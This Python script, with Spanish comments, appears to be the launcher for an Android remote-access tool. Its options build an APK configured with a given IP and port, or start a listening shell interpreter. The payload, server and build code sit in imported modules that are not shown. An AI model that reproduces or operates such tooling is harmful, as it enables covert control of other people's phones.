import socket
from utils import *
from shell import *
from server import *
from build import *
import select
import platform
import argparse
import threading
import sys
import time
import itertools
from colorama import Fore, Style,init

#Animacion 
def animate(message):
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        print("\r"+Style.BRIGHT+Fore.GREEN+message+c+Fore.RESET, end="")
        time.sleep(0.1)
#Detecta por linea de comandos las 2 opciones de trabajo
parser = argparse.ArgumentParser(usage="%(prog)s [--build] [--shell] [-d <IP> -p <PORT> -o <apk name>]")
parser.add_argument('--build',help='For Building the apk',action='store_true')
parser.add_argument('--shell',help='For getting the Interpreter',action='store_true')
parser.add_argument('-i','--ip',metavar="<IP>" ,required=True,type=str,help='Enter the IP')
parser.add_argument('-p','--port',metavar="<Port>", type=str,required=True,help='Enter the Port')
parser.add_argument('-o','--output',metavar="<Apk Name>", type=str,help='Enter the apk Name')
args = parser.parse_args()
#print("arg ejemplo")
#print(args)

clear,direc = clearDirec()

#print(clear)
#print(direc)

if is_valid_ip(args.ip):
    ip = args.ip
else:
    print(Fore.RED+"Not a valid IP"+Fore.RESET)
    sys.exit()

if is_valid_port(args.port):
    port = int(args.port)
else:
    print(Fore.RED+"Not a valid Port"+Fore.RESET)
    sys.exit()

if args.shell:
    print("shell entro")
    create_workers()
    create_jobs()
    #shell2(ip, port)
    #server()
if args.build:
    build(direc, port, ip, args)